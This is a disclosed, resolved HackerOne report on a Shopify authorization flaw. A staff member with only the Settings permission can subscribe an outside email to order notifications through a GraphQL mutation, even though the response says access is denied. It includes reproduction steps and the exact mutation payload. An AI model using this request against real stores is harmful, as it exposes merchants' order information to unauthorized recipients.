---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1102652'
original_report_id: '1102652'
title: staffOrderNotificationSubscriptionCreate Is Not Blocked Entirely From Staff
  Member With Settings Permission
weakness: Improper Authorization
team_handle: shopify
created_at: '2021-02-13T10:11:13.921Z'
disclosed_at: '2022-02-09T20:58:34.749Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 18
asset_identifier: your-store.myshopify.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- improper-authorization
---

# staffOrderNotificationSubscriptionCreate Is Not Blocked Entirely From Staff Member With Settings Permission

## Metadata

- HackerOne Report ID: 1102652
- Weakness: Improper Authorization
- Program: shopify
- Disclosed At: 2022-02-09T20:58:34.749Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi,

I found that the GraphQL call `staffOrderNotificationSubscriptionCreate` is not blocked from the staff member with Settings permission

## Steps to reproduce
- Login as a staff member with `Settings` permission
- Make this GraphQL call to `https://yoursubdomain.myshopify.com/admin/internal/web/graphql/core?operation=SwitcherNoStores`

```
{"query": "mutation{staffOrderNotificationSubscriptionCreate(notificationRecipientIdentifier:\"testingforshopify@ngailong.com\",notificationRecipientType:EMAIL){staffOrderNotificationSubscription{id}}} "}
```

- The response you see should be `Access denied for staffOrderNotificationSubscription field. Required access: `read_notification_settings` access scope. Also: User must have access to orders.`, and you would think this means a dead end, but reality is you have already added the order notification to the settings
- Visit `/admin/settings/notifications` as an admin, you should notice the email `testingforshopify@ngailong.com` is added to the order notification already

## Screenshot video
{F1194404}

## Impact

I found that the GraphQL call `staffOrderNotificationSubscriptionCreate` is not blocked from the staff member with Settings permission

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
